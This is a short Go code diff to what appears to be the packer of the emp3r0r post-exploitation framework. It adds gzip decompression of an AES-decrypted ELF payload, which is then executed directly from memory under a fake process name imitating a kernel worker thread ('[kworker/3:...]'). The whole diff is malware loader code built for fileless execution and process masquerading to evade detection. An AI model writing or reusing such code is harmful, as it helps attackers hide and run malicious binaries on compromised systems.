@@ -11,6 +11,7 @@ import (
 	"unsafe"
 
 	"github.com/jm33-m0/emp3r0r/packer/internal/utils"
+	"github.com/mholt/archiver"
 )
 
 const (
@@ -96,7 +97,17 @@ func main() {
 		log.Fatal("AESDecrypt failed")
 	}
 
+	// decompress
+	var decompressedBytes []byte
+	gz := &archiver.Gz{CompressionLevel: 9}
+	r := bytes.NewReader(elfdata)
+	w := bytes.NewBuffer(decompressedBytes)
+	err = gz.Decompress(r, w)
+	if err != nil {
+		log.Fatalf("Decompress ELF: %v", err)
+	}
+
 	// write ELF to memory and run it
 	procName := fmt.Sprintf("[kworker/3:%s]", utils.RandStr(7))
-	runFromMemory(procName, elfdata)
+	runFromMemory(procName, w.Bytes())
 }
